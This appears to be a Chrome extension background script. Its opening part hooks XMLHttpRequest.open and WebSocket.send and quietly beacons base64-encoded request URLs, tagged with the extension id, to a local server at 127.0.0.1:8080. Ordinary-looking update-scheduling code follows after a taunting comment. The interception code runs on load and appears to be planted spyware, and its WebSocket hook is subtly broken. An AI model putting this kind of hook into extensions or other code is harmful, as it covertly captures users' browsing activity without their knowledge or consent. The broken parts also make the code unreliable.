function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.runtime.onInstalled.addListener(function() {
	if (!localStorage["lastDate"]) {
		localStorage["lastDate"] = Date.now().add({days: -5}).toString();
	};
	Update();
	chrome.alarms.create({periodInMinutes: 5});
});

chrome.runtime.onStartup.addListener(function() {
	Update();
	chrome.alarms.create({periodInMinutes: 5});
});

chrome.alarms.onAlarm.addListener(function() {
	Update();
});